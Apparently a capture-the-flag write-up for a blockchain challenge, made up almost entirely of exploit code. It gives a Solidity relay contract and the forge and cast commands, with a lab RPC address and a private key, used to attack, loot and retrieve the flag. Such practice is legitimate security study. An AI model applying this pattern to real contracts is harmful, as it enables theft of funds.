create a middle man 

`forge init . --force --no-git 
`
Middleman.sol 

```sol
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.13;  
  
contract Middleman {  
    address public target = 0x9ADAFC44200a10b29583438397B6A81A969E48cc;  
  
    function attack(uint256 _damage) external {  
        (bool success, bytes memory result) = target.call(abi.encodeWithSignature("attack(uint256)", _damage));  
        require(success, string(result));  
    }  
}
```

// deploy transaction 

``forge create src/Middleman.sol:Middleman --rpc-url http://94.237.49.73:36209/rpc --private-key 0xd3984677af36a4e5b95808bb51f8cb31c9a8e0f367e5168ccde53cba87be5385 --no-cache --broadcast ``


// send attack using middleman addres "deployed to output "

``cast send 0x5CDDF581552142dFb4a67bE529b2CdFDb6CF318A "attack(uint256)" 1000 --private-key 0xd3984677af36a4e5b95808bb51f8cb31c9a8e0f367e5168ccde53cba87be5385 --rpc-url http://94.237.49.73:36209/rpc 
``

//loot using real targetAddress 

``cast send --rpc-url http://94.237.49.73:36209/rpc --private-key 0xd3984677af36a4e5b95808bb51f8cb31c9a8e0f367e5168ccde53cba87be5385 0x8d9d5B304a1197BC959d6dA66c6DC34349b54043  'loot()'``

`curl http://94.237.49.73:36209/flag`

